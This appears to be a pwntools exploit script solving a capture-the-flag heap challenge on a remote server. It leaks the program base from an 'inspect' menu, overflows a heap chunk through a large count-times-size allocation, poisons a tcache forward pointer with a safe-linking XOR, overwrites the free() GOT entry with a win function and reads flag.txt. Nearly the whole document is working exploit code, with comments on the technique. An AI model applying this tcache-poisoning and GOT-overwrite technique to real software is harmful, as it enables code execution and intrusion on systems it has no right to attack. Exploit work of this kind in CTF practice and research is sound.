from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)
register(3, 1, 16, b'D'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)
_, chk2 = inspect(2)

base_addr = val - 0x136c
win_func = base_addr + 0x14a8
print(f"Base: {hex(base_addr)}, Win: {hex(win_func)}")

delete(2)
delete(1)
delete(0)
# Tcache: 0 -> 1 -> 2

# Top chunk size needs to be intact if we overwrite the top chunk, but we won't reach it if we just write 0s?
# Let's preserve chunk sizes.
# chk0 is at offset 0, chk1 at 0x20, chk2 at 0x40.
# We overwrite 65536 bytes. We should preserve the 0x21 size for chunk 1, chunk 2, and maybe top chunk?
# Since we write zeros, it might mess up the top chunk size.
# What is the top chunk size? We don't know exactly.
# Let's forge a fake top chunk size!
payload = b'A' * 24 # Fill chunk 0 data
payload += p64(0x21) # Chunk 1 size
free_got = base_addr + 0x35f8
fd = free_got ^ (chk1 >> 12)
payload += p64(fd) # Overwrite fd

# To be safe, just make every 0x20 byte look like a chunk of size 0x21,
# and put a huge top chunk at the end.
for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21) # Fake size

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

print("Allocated chunk 0 with overflow")

register(1, 1, 16, b'X'*16)
print("Allocated chunk 1")

# The next allocation should be at free_got.
register(2, 1, 16, p64(win_func) + p64(0))
print("Allocated chunk 2 (at free_got)")

# Call free(3) to trigger win_func!
p.sendline(b'4')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'3')

print("Triggered win_func")
p.sendline(b'cat flag.txt')
print(p.recv(1024, timeout=2).decode())

p.close()
